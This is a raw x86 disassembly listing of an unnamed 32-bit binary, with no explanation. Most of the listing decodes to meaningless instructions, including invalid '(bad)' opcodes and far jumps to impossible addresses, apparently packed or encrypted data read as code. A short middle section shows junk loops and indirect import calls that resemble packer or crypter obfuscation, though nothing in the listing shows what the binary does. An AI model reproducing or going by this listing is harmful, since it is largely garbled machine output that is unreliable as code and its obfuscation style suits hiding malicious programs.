  40ccf9:	retf   0x6979
  40ccfc:	imul   BYTE PTR [ecx-0x5380d102]
  40cd02:	jmp    0x40cd61
  40cd04:	gs cmc 
  40cd06:	mov    esi,0xa5686ec2
  40cd0b:	adc    al,0x6d
  40cd0d:	mov    cl,0xcf
  40cd0f:	or     BYTE PTR [esp+edi*1-0x53758d05],0x41
  40cd17:	mov    bh,dh
  40cd19:	mov    dh,0x37
  40cd1b:	dec    ecx
  40cd1c:	aam    0x7e
  40cd1e:	cmp    DWORD PTR [edi-0x51],ebp
  40cd21:	adc    al,0x51
  40cd23:	or     eax,0xa120b6ce
  40cd28:	jns    0x40cd25
  40cd2a:	xlat   BYTE PTR ds:[ebx]
  40cd2b:	pop    es
  40cd2c:	outs   dx,BYTE PTR ds:[esi]
  40cd2d:	ins    DWORD PTR es:[edi],dx
  40cd2e:	xchg   edi,eax
  40cd2f:	mov    ah,0x1a
  40cd31:	cli    
  40cd32:	inc    eax
  40cd33:	(bad)
  40cd36:	sub    BYTE PTR [edi-0x19ed76cb],cl
  40cd3c:	or     BYTE PTR [edx+eax*4+0x2025705f],cl
  40cd43:	xchg   BYTE PTR [eax],bl
  40cd45:	gs jge 0x40cd41
  40cd48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd49:	ret    0x6b91
  40cd4c:	out    dx,eax
  40cd4d:	sub    DWORD PTR [edi+ecx*4-0x67],ebp
  40cd51:	aas    
  40cd52:	cmp    BYTE PTR [edx],0x6b
  40cd55:	push   ebp
  40cd56:	lods   al,BYTE PTR ds:[esi]
  40cd57:	lods   eax,DWORD PTR ds:[esi]
  40cd58:	into   
  40cd59:	xor    DWORD PTR [ebx-0x9],edx
  40cd5c:	cdq    
  40cd5d:	dec    esp
  40cd5e:	push   ds
  40cd5f:	aaa    
  40cd60:	adc    esp,eax
  40cd62:	dec    esi
  40cd63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd64:	nop
  40cd65:	xor    dh,BYTE PTR [edi+ebp*2]
  40cd68:	sub    BYTE PTR [ebx-0xa6ed0a2],0x32
  40cd6f:	adc    eax,0x87e6c340
  40cd74:	jle    0x40cd37
  40cd76:	dec    esi
  40cd77:	dec    eax
  40cd78:	scas   eax,DWORD PTR es:[edi]
  40cd79:	cwde   
  40cd7a:	xor    DWORD PTR [edx+0x26],ebp
  40cd7d:	sahf   
  40cd7e:	xchg   ecx,eax
  40cd7f:	(bad)  
  40cd80:	cld    
  40cd81:	popf   
  40cd82:	sbb    al,0xfd
  40cd84:	mov    cl,0x58
  40cd86:	mov    BYTE PTR [eax],dl
  40cd88:	xchg   edi,eax
  40cd89:	(bad)  [edx+0x27]
  40cd8c:	xor    cl,BYTE PTR [esp+edi*8+0x228c437]
  40cd93:	and    esi,ebx
  40cd95:	xchg   ebp,eax
  40cd96:	rol    eax,1
  40cd98:	inc    esi
  40cd99:	and    eax,0x15ea0aa6
  40cd9e:	mov    bl,0x2c
  40cda0:	into   
  40cda1:	fsub   DWORD PTR [ebx]
  40cda3:	mov    BYTE PTR [ecx+ebx*8],bh
  40cda6:	inc    ebx
  40cda7:	and    DWORD PTR [esi+0x661ac0cb],ebx
  40cdad:	call   0x31ccedd7
  40cdb2:	popa   
  40cdb3:	add    esp,DWORD PTR [edx-0x69]
  40cdb6:	push   ds
  40cdb7:	inc    ecx
  40cdb8:	(bad)  
  40cdb9:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdbb:	mov    ch,0xd9
  40cdbd:	dec    edi
  40cdbe:	data16 test al,0x40
  40cdc1:	inc    ebx
  40cdc2:	dec    ecx
  40cdc3:	dec    edx
  40cdc4:	jmp    0x40cd9b
  40cdc6:	stc    
  40cdc7:	xchg   edi,eax
  40cdc8:	out    dx,al
  40cdc9:	daa    
  40cdca:	imul   ebp,DWORD PTR [eax-0x3dfc2030],0x26fe9
  40cdd4:	add    BYTE PTR [edi+0x4b],dh
  40cdd7:	and    eax,0x717221b4
  40cddc:	dec    ebx
  40cddd:	xchg   DWORD PTR [edx-0x3eef6e42],eax
  40cde3:	out    dx,eax
  40cde4:	sbb    eax,0x707080a5
  40cde9:	leave  
  40cdea:	jle    0x40ce5c
  40cdec:	jo     0x40cd88
  40cdee:	dec    edx
  40cdef:	mov    dl,0x23
  40cdf1:	into   
  40cdf2:	(bad)  
  40cdf4:	outs   dx,DWORD PTR ds:[esi]
  40cdf5:	jle    0x40cdb4
  40cdf7:	(bad)  
  40cdf8:	jp     0x40cd7b
  40cdfa:	scas   eax,DWORD PTR es:[edi]
  40cdfb:	dec    esi
  40cdfc:	add    dh,dh
  40cdfe:	scas   al,BYTE PTR es:[edi]
  40cdff:	add    eax,0xd58d0402
  40ce04:	ins    DWORD PTR es:[edi],dx
  40ce05:	xor    al,0x61
  40ce07:	and    dh,BYTE PTR [eax-0x4c]
  40ce0a:	push   esp
  40ce0b:	test   al,0x55
  40ce0d:	push   0x7500a1e4
  40ce12:	out    dx,al
  40ce13:	call   0x740d:0x8a1047c7
  40ce1a:	mov    ecx,0x173a0c1d
  40ce1f:	mov    ds:0x53a8e5e2,eax
  40ce24:	inc    edx
  40ce25:	mov    bh,0xfe
  40ce27:	mov    ds:0x4d7ea187,al
  40ce2c:	retf   0x89aa
  40ce2f:	scas   eax,DWORD PTR es:[edi]
  40ce30:	mov    ebx,DWORD PTR [ebx+eax*1-0x711eb5dc]
  40ce37:	aad    0x6a
  40ce39:	xor    eax,0xa912a5b7
  40ce3e:	(bad)  
  40ce40:	ret    
  40ce41:	(bad)  
  40ce42:	repnz xor BYTE PTR [edi+0x57],ch
  40ce46:	or     edx,ecx
  40ce48:	daa    
  40ce49:	sub    eax,0x88ff4254
  40ce4e:	sub    BYTE PTR [ebx*2+0x650c34c1],cl
  40ce55:	sub    esp,edi
  40ce57:	xor    bh,dl
  40ce59:	in     eax,0x4c
  40ce5b:	sub    ah,BYTE PTR [ebx-0x51d3e242]
  40ce61:	hlt    
  40ce62:	mov    ch,0x37
  40ce64:	push   ebp
  40ce65:	(bad)  
  40ce66:	test   BYTE PTR [ecx+0x6a],dl
  40ce69:	xchg   esp,eax
  40ce6a:	jg     0x40ce01
  40ce6c:	lahf   
  40ce6d:	into   
  40ce6e:	imul   edx,DWORD PTR [ebx+edi*8],0x5c5b6d79
  40ce75:	or     esi,DWORD PTR [eax]
  40ce77:	je     0x40cec1
  40ce79:	dec    esp
  40ce7a:	js     0x40ce1c
  40ce7c:	pop    ebx
  40ce7d:	push   edi
  40ce7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce7f:	stc    
  40ce80:	arpl   WORD PTR [ecx+0x24],dx
  40ce83:	or     BYTE PTR [ebx-0x21],ah
  40ce86:	and    al,BYTE PTR [esi+0x45]
  40ce89:	in     al,0x8b
  40ce8b:	adc    DWORD PTR [esi],ebx
  40ce8d:	push   ebx
  40ce8e:	jp     0x40ced1
  40ce90:	int    0xe6
  40ce92:	sub    ah,BYTE PTR [eax-0xf]
  40ce95:	xor    BYTE PTR [eax],bh
  40ce97:	out    dx,eax
  40ce98:	test   BYTE PTR [ebp*1-0x67cfac1e],cl
  40ce9f:	add    al,0x19
  40cea1:	popf   
  40cea2:	pop    esi
  40cea3:	sub    DWORD PTR [esi+0x4ee3fc69],edx
  40cea9:	mov    dl,dl
  40ceab:	gs mov dh,0x26
  40ceae:	repz gs fs dec ecx
  40ceb2:	jbe    0x40ce96
  40ceb4:	mov    eax,ds
  40ceb6:	popa   
  40ceb7:	mov    es,WORD PTR [ebp+edi*8-0x71]
  40cebb:	ins    BYTE PTR es:[edi],dx
  40cebc:	(bad)  
  40cebd:	cmp    al,0xff
  40cebf:	cmp    BYTE PTR [ecx-0x3ac02cc2],dh
  40cec5:	ret    
  40cec6:	aaa    
  40cec7:	cmp    BYTE PTR [ebx+0x29],ch
  40ceca:	mov    edi,0xcd8bc8d8
  40cecf:	cmc    
  40ced0:	rol    BYTE PTR [ebp+0x6fa34e37],1
  40ced6:	xor    eax,0x6baffaf9
  40cedb:	lahf   
  40cedc:	dec    eax
  40cedd:	sbb    bl,BYTE PTR [edx+0x54]
  40cee0:	push   edi
  40cee1:	ins    DWORD PTR es:[edi],dx
  40cee2:	xor    al,0xca
  40cee4:	sub    ah,BYTE PTR [eax]
  40cee6:	pop    eax
  40cee7:	inc    eax
  40cee8:	push   ebp
  40cee9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ceea:	fs das 
  40ceec:	pop    eax
  40ceed:	fst    QWORD PTR [esi-0x7c3b8d7]
  40cef3:	pop    ds
  40cef4:	xchg   edx,eax
  40cef5:	cmp    DWORD PTR [edx],ebx
  40cef7:	mov    eax,ds:0x3ca8962d
  40cefc:	push   edi
  40cefd:	sub    DWORD PTR fs:[ebx],0xffffffec
  40cf01:	fwait
  40cf02:	(bad)  
  40cf03:	push   eax
  40cf04:	jmp    0x40cead
  40cf06:	inc    ebx
  40cf07:	into   
  40cf08:	popa   
  40cf09:	(bad)  
  40cf0a:	and    ah,BYTE PTR [ebx-0x2ebc8299]
  40cf10:	pop    edi
  40cf11:	inc    ebp
  40cf12:	xchg   edi,eax
  40cf13:	mov    cl,0x30
  40cf15:	or     al,0xb0
  40cf18:	or     eax,0x7a8903f6
  40cf1d:	movhps xmm1,QWORD PTR [ecx-0x27]
  40cf21:	rcr    BYTE PTR [ecx+eiz*1-0x2c71ab94],1
  40cf28:	scas   al,BYTE PTR es:[edi]
  40cf29:	or     eax,0x20e31fe0
  40cf2e:	outs   dx,BYTE PTR ds:[esi]
  40cf2f:	xor    dh,BYTE PTR [ebx+eiz*1]
  40cf32:	xchg   ecx,eax
  40cf33:	mov    ds,WORD PTR [esi]
  40cf35:	jp     0x40cf19
  40cf37:	add    eax,0x36335900
  40cf3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf3d:	lea    edi,[edi+0x21]
  40cf40:	cmp    edx,DWORD PTR [eax-0x9]
  40cf43:	mov    ebp,fs
  40cf45:	push   esi
  40cf46:	lea    esi,[edi+edx*8-0x5b2e6d87]
  40cf4d:	mov    eax,DWORD PTR [ebp-0x46]
  40cf50:	pop    edx
  40cf51:	mov    ebp,0xfa38e75a
  40cf56:	int    0x28
  40cf58:	lea    esp,[edi-0x62]
  40cf5b:	mov    al,ds:0xe72801ce
  40cf60:	pop    edx
  40cf61:	or     eax,esp
  40cf63:	call   0xc5949023
  40cf68:	addr16 inc ecx
  40cf6a:	xchg   ebp,eax
  40cf6b:	cwde   
  40cf6c:	repz adc eax,0xbc8d6c77
  40cf72:	ss cs fxch st(3)
  40cf76:	int3   
  40cf77:	add    ebp,esi
  40cf79:	xor    eax,0x25a2cdd9
  40cf7e:	test   al,0xfd
  40cf80:	hlt    
  40cf81:	daa    
  40cf82:	sti    
  40cf83:	test   BYTE PTR [edi-0x3a02f200],0xfe
  40cf8a:	loop   0x40cfb3
  40cf8c:	ds push esp
  40cf8e:	push   edi
  40cf8f:	xchg   esp,eax
  40cf90:	fs std 
  40cf92:	xchg   edx,eax
  40cf93:	lock dec ebx
  40cf95:	sub    esi,0xe152b78a
  40cf9b:	dec    ecx
  40cf9c:	lods   eax,DWORD PTR ds:[esi]
  40cf9d:	aam    0x12
  40cf9f:	(bad)  
  40cfa0:	mov    ch,0xab
  40cfa2:	mov    bl,0xbb
  40cfa4:	fucomp st(0)
  40cfa6:	popf   
  40cfa7:	mov    edx,0xf44e6ff2
  40cfac:	nop
  40cfad:	pop    ecx
  40cfae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfaf:	sbb    eax,0xe4754441
  40cfb4:	dec    esi
  40cfb5:	add    dl,ch
  40cfb7:	imul   ecx,DWORD PTR [edx+0x48],0x3b
  40cfbb:	(bad)  
  40cfbc:	outs   dx,BYTE PTR ds:[esi]
  40cfbd:	imul   edi,DWORD PTR [edi-0x44],0xb58f7a4a
  40cfc4:	jbe    0x40d021
  40cfc6:	inc    edx
  40cfc7:	fild   QWORD PTR [edi+0x7fd0eb08]
  40cfcd:	inc    ebp
  40cfce:	xchg   esi,eax
  40cfcf:	mov    BYTE PTR [esi+0x2],bh
  40cfd2:	xchg   BYTE PTR [edi-0x18b7805e],dl
  40cfd8:	jns    0x40d023
  40cfda:	or     DWORD PTR [eax],esi
  40cfdc:	outs   dx,DWORD PTR ds:[esi]
  40cfdd:	call   0xcb90:0xd0718317
  40cfe4:	mov    edi,edx
  40cfe6:	inc    ecx
  40cfe7:	push   ecx
  40cfe8:	inc    ebx
  40cfe9:	fmul   DWORD PTR [edi+0x396494dd]
  40cfef:	add    BYTE PTR [eax],0xde
  40cff2:	sub    bl,al
  40cff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cff5:	lahf   
  40cff6:	fcmovnbe st,st(3)
  40cff8:	dec    ebx
  40cff9:	cmp    al,0xe7
  40cffb:	test   BYTE PTR [ebx-0x7e7d1e70],dh
  40d001:	pop    ebp
  40d002:	jo     0x40d015
  40d004:	int    0x33
  40d006:	and    bl,BYTE PTR [eax]
  40d008:	hlt    
  40d009:	xor    ebp,DWORD PTR [esi]
  40d00b:	jg     0x40cfae
  40d00d:	xlat   BYTE PTR ds:[ebx]
  40d00e:	shr    bl,0xb4
  40d011:	fisttp DWORD PTR [ebp-0x64b95e07]
  40d017:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d018:	dec    edi
  40d019:	jl     0x40d051
  40d01b:	jmp    0x9a4f:0xe368affa
  40d022:	adc    DWORD PTR ds:0x5c26889c,0xd883287a
  40d02c:	mov    ch,0xef
  40d02e:	mov    esi,0x793233dd
  40d033:	xor    DWORD PTR [esi-0x9],esp
  40d036:	dec    edi
  40d037:	mov    DWORD PTR [esi+eiz*8-0x412c79cb],ebx
  40d03e:	jecxz  0x40cff7
  40d040:	jae    0x40d0b9
  40d042:	(bad)  
  40d043:	dec    ebx
  40d044:	mov    ds:0x41621c,eax
  40d049:	mov    eax,DWORD PTR [ebp+0xc]
  40d04c:	xor    eax,ecx
  40d04e:	add    eax,edx
  40d050:	mov    ds:0x416224,eax
  40d055:	jmp    0x40d064
  40d05a:	mov    eax,ds:0x416224
  40d05f:	mov    ds:0x41621c,eax
  40d064:	mov    eax,DWORD PTR [ebp+0x8]
  40d067:	mov    eax,DWORD PTR [eax]
  40d069:	mov    ecx,DWORD PTR ds:0x41621c
  40d06f:	add    DWORD PTR [eax],ecx
  40d071:	pop    esi
  40d072:	pop    ebp
  40d073:	ret    0x8
  40d076:	push   ebp
  40d077:	mov    ebp,esp
  40d079:	sub    esp,0x30
  40d07c:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d083:	mov    eax,ds:0x4343be
  40d088:	mov    ecx,DWORD PTR ds:0x432972
  40d08e:	sub    eax,ecx
  40d090:	and    eax,DWORD PTR [eax+ecx*1]
  40d093:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  40d09a:	mov    DWORD PTR ds:0x434396,0x14
  40d0a4:	cmp    DWORD PTR ds:0x434396,0x0
  40d0ab:	je     0x40d158
  40d0b1:	cmp    DWORD PTR ds:0x434396,0x3
  40d0b8:	jne    0x40d0d1
  40d0be:	push   0x143e
  40d0c3:	push   0x3596
  40d0c8:	push   DWORD PTR [ebp-0xc]
  40d0cb:	call   DWORD PTR ds:0x432c6a
  40d0d1:	cmp    DWORD PTR ds:0x434396,0x4
  40d0d8:	jne    0x40d0e9
  40d0de:	mov    eax,ds:0x434396
  40d0e3:	dec    eax
  40d0e4:	mov    ds:0x434396,eax
  40d0e9:	xor    eax,eax
  40d0eb:	add    eax,DWORD PTR ds:0x434396
  40d0f1:	dec    eax
  40d0f2:	mov    ds:0x434396,eax
  40d0f7:	jmp    0x40d0a4
  40d0fc:	and    DWORD PTR ds:0x434372,0x0
  40d106:	jmp    0x40d118
  40d10b:	mov    ecx,DWORD PTR ds:0x434372
  40d111:	inc    ecx
  40d112:	mov    DWORD PTR ds:0x434372,ecx
  40d118:	cmp    DWORD PTR ds:0x434372,0x18
  40d11f:	jae    0x40d158
  40d125:	cmp    DWORD PTR ds:0x434372,0x20
  40d12c:	jne    0x40d13d
  40d132:	push   0x432dc6
  40d137:	call   DWORD PTR ds:0x4329ee
  40d13d:	jmp    0x40d10b
  40d142:	xor    ecx,ecx
  40d144:	xor    ecx,DWORD PTR ds:0x432e6c
  40d14a:	xor    eax,eax
  40d14c:	add    eax,DWORD PTR ds:0x434431
  40d152:	sub    eax,ecx
  40d154:	imul   ecx,DWORD PTR [ecx+eax*1]
  40d158:	mov    ecx,DWORD PTR [ebp-0x4]
  40d15b:	add    DWORD PTR ds:0x43437e,0x5a83
  40d165:	push   ebx
  40d166:	mov    eax,0x7510855
  40d16b:	sbb    ebx,DWORD PTR ds:0x432dde
  40d171:	xor    ecx,eax
  40d173:	sbb    DWORD PTR ds:0x432704,ebx
  40d179:	mov    ebx,0x32729c
  40d17e:	add    ecx,ebx
  40d180:	and    DWORD PTR ds:0x434421,0x2948
  40d18a:	mov    DWORD PTR [ebp-0x1c],ecx
  40d18d:	mov    DWORD PTR ds:0x43438a,0x11
  40d197:	cmp    DWORD PTR ds:0x43438a,0x0
  40d19e:	je     0x40d204
  40d1a4:	cmp    DWORD PTR ds:0x43438a,0x8
  40d1ab:	jne    0x40d1c4
  40d1b1:	push   0x6033
  40d1b6:	push   DWORD PTR [ebp-0xc]
  40d1b9:	push   0x6be4
  40d1be:	call   DWORD PTR ds:0x432c6e
  40d1c4:	cmp    DWORD PTR ds:0x43438a,0x9
  40d1cb:	jne    0x40d1e0
  40d1d1:	xor    ecx,ecx
  40d1d3:	xor    ecx,DWORD PTR ds:0x43438a
  40d1d9:	dec    ecx
  40d1da:	mov    DWORD PTR ds:0x43438a,ecx
  40d1e0:	mov    ecx,DWORD PTR ds:0x43438a
  40d1e6:	dec    ecx
  40d1e7:	mov    DWORD PTR ds:0x43438a,ecx
  40d1ed:	jmp    0x40d197
  40d1f2:	mov    ecx,DWORD PTR ds:0x432dd6
  40d1f8:	sub    ecx,DWORD PTR ds:0x434396
  40d1fe:	mov    DWORD PTR ds:0x432dd6,ecx
  40d204:	mov    ecx,DWORD PTR [ebp+0x14]
  40d207:	sbb    DWORD PTR ds:0x43436e,0x39f6
  40d211:	push   esi
  40d212:	adc    DWORD PTR ds:0x434425,0x43436a
  40d21c:	push   edi
  40d21d:	adc    DWORD PTR ds:0x434376,0x784e
  40d227:	test   ecx,ecx
  40d229:	mov    DWORD PTR ds:0x434415,0x1f53
  40d233:	je     0x40d303
  40d239:	and    DWORD PTR ds:0x434421,0x0
  40d243:	jmp    0x40d255
  40d248:	mov    ecx,DWORD PTR ds:0x434421
  40d24e:	inc    ecx
  40d24f:	mov    DWORD PTR ds:0x434421,ecx
  40d255:	cmp    DWORD PTR ds:0x434421,0x11
  40d25c:	jae    0x40d2ec
  40d262:	cmp    DWORD PTR ds:0x434421,0x16
  40d269:	jne    0x40d286
  40d26f:	push   0x8d47
  40d274:	push   DWORD PTR [ebp-0x14]
  40d277:	push   DWORD PTR [ebp-0x1c]
  40d27a:	push   DWORD PTR [ebp-0x28]
  40d27d:	push   DWORD PTR [ebp-0x18]
  40d280:	call   DWORD PTR ds:0x4329f2
  40d286:	jmp    0x40d248
  40d28b:	mov    DWORD PTR ds:0x4326fc,0x13
  40d295:	cmp    DWORD PTR ds:0x4326fc,0x0
  40d29c:	je     0x40d2ec
  40d2a2:	cmp    DWORD PTR ds:0x4326fc,0x9
  40d2a9:	jne    0x40d2ba
  40d2af:	push   0x8
  40d2b1:	push   DWORD PTR [ebp-0x20]
  40d2b4:	call   DWORD PTR ds:0x432d22
  40d2ba:	cmp    DWORD PTR ds:0x4326fc,0xa
  40d2c1:	jne    0x40d2d4
  40d2c7:	mov    esi,DWORD PTR ds:0x4326fc
  40d2cd:	dec    esi
  40d2ce:	mov    DWORD PTR ds:0x4326fc,esi
  40d2d4:	mov    esi,DWORD PTR ds:0x4326fc
  40d2da:	dec    esi
  40d2db:	mov    DWORD PTR ds:0x4326fc,esi
  40d2e1:	jmp    0x40d295
  40d2e6:	not    DWORD PTR ds:0x4326f4
  40d2ec:	mov    ecx,DWORD PTR [ebp+0x14]
  40d2ef:	neg    esi
  40d2f1:	mov    ecx,DWORD PTR [ecx]
  40d2f3:	movzx  esi,WORD PTR ds:0x434429
  40d2fa:	add    DWORD PTR ds:0x434392,esi
  40d300:	mov    DWORD PTR [ebp-0x1c],ecx
  40d303:	imul   edx,eax
  40d306:	jmp    0x40d6fa
  40d30b:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  40d311:	imul   esi,DWORD PTR gs:[eax+0x3],0xef73624d
  40d319:	repnz mov DWORD PTR [esi-0x73],edi
  40d31d:	jo     0x40d38f
  40d31f:	dec    ecx
  40d320:	jge    0x40d392
  40d322:	jo     0x40d37c
  40d324:	test   eax,0x4d016b53
  40d329:	xchg   esi,eax
  40d32a:	inc    edx
  40d32b:	addr16 out dx,eax
  40d32d:	jo     0x40d349
  40d32f:	clc    
  40d330:	and    ebp,DWORD PTR ds:0xbf3aa7b7
  40d336:	daa    
  40d337:	in     eax,dx
  40d338:	mov    bh,0x64
  40d33a:	adc    ch,BYTE PTR [esi+ecx*4]
  40d33d:	jo     0x40d369
  40d33f:	sbb    bh,dl
  40d341:	push   cs
  40d342:	stos   DWORD PTR es:[edi],eax
  40d343:	cmp    eax,0xbf5a4673
  40d348:	adc    DWORD PTR [ecx+0x6b009434],0xf992d9eb
  40d352:	jp     0x40d2e8
  40d354:	push   0x44c7353b
  40d359:	jle    0x40d2f7
  40d35b:	retf   0x3111
  40d35e:	jge    0x40d313
  40d360:	test   edi,edx
  40d362:	xor    DWORD PTR [esp+esi*4-0x68b8870c],0xffffffcd
  40d36a:	inc    esp
  40d36b:	sbb    dh,bh
  40d36d:	pop    edi
  40d36e:	jmp    0xd6d068c4
  40d373:	aaa    
  40d374:	mov    BYTE PTR [eax-0x2e],dh
  40d377:	retf   
  40d378:	sbb    eax,0xb4271879
  40d37d:	adc    BYTE PTR [edi-0x4e19a9bf],0x84
  40d384:	int3   
  40d385:	xor    BYTE PTR [eax],ch
  40d387:	fwait
  40d388:	sbb    ebp,DWORD PTR [edx+0x5e]
  40d38b:	test   al,0x31
  40d38d:	ja     0x40d39a
  40d38f:	gs retf 0x5a3b
  40d393:	inc    ebx
  40d394:	jmp    0x12772e97
  40d399:	in     al,0x1b
  40d39b:	icebp  
  40d39c:	jg     0x40d32d
  40d39e:	cli    
  40d39f:	and    al,0x8d
  40d3a1:	adc    al,0x17
  40d3a3:	or     eax,0x4fec37e3
  40d3a8:	icebp  
  40d3a9:	test   edx,esp
  40d3ab:	inc    edx
  40d3ac:	push   ebp
  40d3ad:	jmp    0xc149:0xbfc656fe
  40d3b4:	lahf   
  40d3b5:	push   0x3a
  40d3b7:	cli    
  40d3b8:	pop    eax
  40d3b9:	fnstsw WORD PTR [esi]
  40d3bb:	cmp    BYTE PTR [ecx+0x1c],ah
  40d3be:	jo     0x40d40f
  40d3c0:	cmp    eax,0x6c93b3b9
  40d3c5:	ins    BYTE PTR es:[edi],dx
  40d3c6:	int3   
  40d3c7:	clc    
  40d3c8:	pop    esi
  40d3c9:	mov    bl,0x26
  40d3cb:	(bad)  
  40d3cd:	lods   eax,DWORD PTR ds:[esi]
  40d3ce:	jnp    0x40d436
  40d3d0:	lahf   
  40d3d1:	in     eax,0x82
  40d3d3:	imul   ecx,DWORD PTR ds:[esi-0x60a31bda],0x39a31eae
  40d3de:	in     eax,dx
  40d3df:	rcr    BYTE PTR [ecx-0x7ba077c0],1
  40d3e5:	push   es
  40d3e6:	addr16 jle 0x40d381
  40d3e9:	sub    DWORD PTR [ecx],edx
  40d3eb:	cmc    
  40d3ec:	add    bl,0x51
  40d3ef:	xchg   ecx,eax
  40d3f0:	push   cs
  40d3f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3f2:	mov    ecx,0x11cf1fb4
  40d3f7:	adc    al,BYTE PTR [ecx*2-0x24883325]
  40d3fe:	int3   
  40d3ff:	sub    al,0xbb
  40d401:	pop    es
  40d402:	aad    0x8f
  40d404:	mov    esi,eax
  40d406:	sbb    eax,0x46b36b4c
  40d40b:	and    BYTE PTR [ebp-0x16],0x4f
  40d40f:	pop    ss
  40d410:	and    bl,BYTE PTR [ebx+0x5c]
  40d413:	dec    ebx
  40d414:	mov    ds:0xda512ff5,eax
  40d419:	(bad)
  40d41c:	ja     0x40d3bc
  40d41e:	scas   eax,DWORD PTR es:[edi]
  40d41f:	fist   DWORD PTR [ebp+0x73]
  40d422:	sub    dh,bh
  40d424:	mov    es,WORD PTR [ecx+eiz*2-0xd]
  40d428:	(bad)  
  40d429:	in     eax,0x66
  40d42b:	xchg   esp,eax
  40d42c:	xchg   DWORD PTR [edx-0x68],esp
  40d42f:	aas    
  40d430:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d431:	mov    esp,0x359d4f69
  40d436:	and    al,BYTE PTR [edi-0x46c83fe3]
  40d43c:	dec    esp
  40d43d:	daa    
  40d43e:	jge    0x40d46f
  40d440:	aad    0x51
  40d442:	data16 ss adc al,0x8c
  40d446:	lods   eax,DWORD PTR ds:[esi]
  40d447:	outs   dx,BYTE PTR ds:[esi]
  40d448:	ds mov eax,0xb93c2793
  40d44e:	retf   0x8c96
  40d451:	and    edx,DWORD PTR [eax-0x29]
  40d454:	xchg   edx,eax
  40d455:	adc    DWORD PTR [edi],ebp
  40d457:	out    dx,eax
  40d458:	pop    eax
  40d459:	pop    edx
  40d45a:	dec    ecx
  40d45b:	ret    0x50e6
  40d45e:	adc    al,0xdc
  40d460:	(bad)  
  40d462:	sbb    DWORD PTR [esi],ecx
  40d464:	jb     0x40d4d5
  40d466:	cdq    
  40d467:	fimul  DWORD PTR [ecx+0x438882aa]
  40d46d:	jo     0x40d492
  40d46f:	in     eax,0xb0
  40d471:	jecxz  0x40d406
  40d473:	fisubr DWORD PTR [esi-0x3b3c4a29]
  40d479:	adc    ebp,DWORD PTR [eax]
  40d47b:	mov    dl,0xc3
  40d47d:	paddw  mm2,QWORD PTR [esi+0x1ece6a25]
  40d484:	repnz adc cl,BYTE PTR [ebx-0x7e]
  40d488:	and    eax,0x725821be
  40d48d:	mov    bh,0x57
  40d48f:	idiv   BYTE PTR [eax+0x6441e370]
  40d495:	push   esp
  40d496:	adc    BYTE PTR [edi-0x4074b17c],0xe3
  40d49d:	call   0xf20ddbf1
  40d4a2:	imul   ebx,DWORD PTR [ebx-0x42],0xffffffe2
  40d4a6:	pop    ebx
  40d4a7:	aas    
  40d4a8:	in     al,0x6
  40d4aa:	ja     0x40d496
  40d4ac:	ret    
  40d4ad:	fcom   DWORD PTR [esi]
  40d4af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4b0:	pop    esp
  40d4b1:	push   0xffffffc4
  40d4b3:	dec    esp
  40d4b4:	sub    al,0x97
  40d4b6:	push   0xfffffffa
  40d4b8:	scas   eax,DWORD PTR es:[edi]
  40d4b9:	push   esi
  40d4ba:	mov    ecx,0xc9b836ad
  40d4bf:	and    eax,0x13696949
  40d4c4:	pop    edi
  40d4c5:	loop   0x40d4b4
  40d4c7:	sbb    eax,0x5a69bba3
  40d4cc:	inc    ebx
  40d4cd:	sbb    al,0xec
  40d4cf:	jp     0x40d466
  40d4d1:	fs cmp dl,dh
  40d4d4:	push   esp
  40d4d5:	cmp    eax,DWORD PTR [edi-0x921851a]
  40d4db:	push   esi
  40d4dc:	dec    edx
  40d4dd:	or     eax,DWORD PTR [edi-0x24]
  40d4e0:	sub    DWORD PTR [ecx+0x5f4e4ab3],ebp
  40d4e6:	xchg   BYTE PTR [edx-0x1d],al
  40d4e9:	pop    ebp
  40d4ea:	xchg   esi,eax
  40d4eb:	mov    esi,0xa68c6d33
  40d4f0:	sbb    bl,BYTE PTR [ebx+0x5a34035a]
  40d4f6:	cmp    eax,DWORD PTR [eax-0x494fa695]
  40d4fc:	mov    eax,0x4f26c2b9
  40d501:	cmp    eax,0x1f6dfb81
  40d506:	adc    al,0x4f
  40d508:	mov    dl,0x99
  40d50a:	nop
  40d50b:	mov    edx,0x2e81e3c4
  40d510:	xchg   edi,eax
  40d511:	imul   DWORD PTR [edx+0x2cc8191]
  40d517:	mov    cl,0xd1
  40d519:	aaa    
  40d51a:	sti    
  40d51b:	mov    ah,0x91
  40d51d:	pushf  
  40d51e:	ja     0x40d4b1
  40d520:	mov    BYTE PTR [eax],ch
  40d522:	and    DWORD PTR [eax],0x112762b0
  40d528:	jo     0x40d4de
  40d52a:	stc    
  40d52b:	adc    BYTE PTR [esi+ebp*2],0x33
  40d52f:	scas   al,BYTE PTR es:[edi]
  40d530:	sbb    ch,BYTE PTR ds:0xd84812f9
  40d536:	pop    ss
  40d537:	push   ebx
  40d538:	pop    edi
  40d539:	loopne 0x40d56d
  40d53b:	cs jo  0x40d4fc
  40d53e:	pop    eax
  40d53f:	mov    dh,BYTE PTR [ecx+0x30]
  40d542:	ret    0xccf0
  40d545:	xor    eax,0xfbc53940
  40d54a:	loope  0x40d56b
  40d54c:	push   edi
  40d54d:	and    DWORD PTR [edx-0x3b20f18e],edx
  40d553:	xor    al,0x51
  40d555:	mov    bl,0x70
  40d557:	fisubr DWORD PTR [ecx]
  40d559:	es xchg edi,eax
  40d55b:	and    bl,BYTE PTR [ecx]
  40d55d:	dec    edi
  40d55e:	shr    dl,cl
  40d560:	dec    esi
  40d561:	inc    ebx
  40d562:	xlat   BYTE PTR ds:[ebx]
  40d563:	or     esp,eax
  40d565:	in     eax,0x1a
